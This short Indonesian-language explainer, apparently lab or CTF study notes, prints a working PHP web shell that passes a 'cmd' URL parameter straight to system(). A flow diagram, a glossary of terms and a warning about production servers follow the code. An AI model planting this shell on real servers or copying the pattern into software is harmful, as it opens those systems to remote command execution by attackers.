## PHP Web Shell

```php
<form method="GET">
<input type="TEXT" name="cmd">
<input type="SUBMIT" value="Execute">
</form>

<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
```

**Keterangan:**

```text
PHP Web Shell
    ↓
Input command melalui parameter ?cmd=
    ↓
$_GET['cmd']
    ↓
system()
    ↓
Command Execution
```

`system()` menjalankan command sistem operasi yang diberikan melalui input
pengguna. Karena tidak terdapat validasi atau pembatasan command, kode ini
merupakan **arbitrary command execution** dan dapat menjadi **RCE** jika
tersedia pada server yang dapat diakses attacker.

### Istilah

```text
Web Shell       → Interface web untuk menjalankan command pada server
system()        → Fungsi PHP untuk menjalankan command OS
$_GET['cmd']    → Input command dari URL/form
2>&1            → Menggabungkan output error dengan output standar
RCE             → Remote Code Execution
```

> **Catatan:** kode seperti ini dapat digunakan secara sah untuk lab/CTF,
> tetapi sangat berbahaya jika ditempatkan pada server produksi.
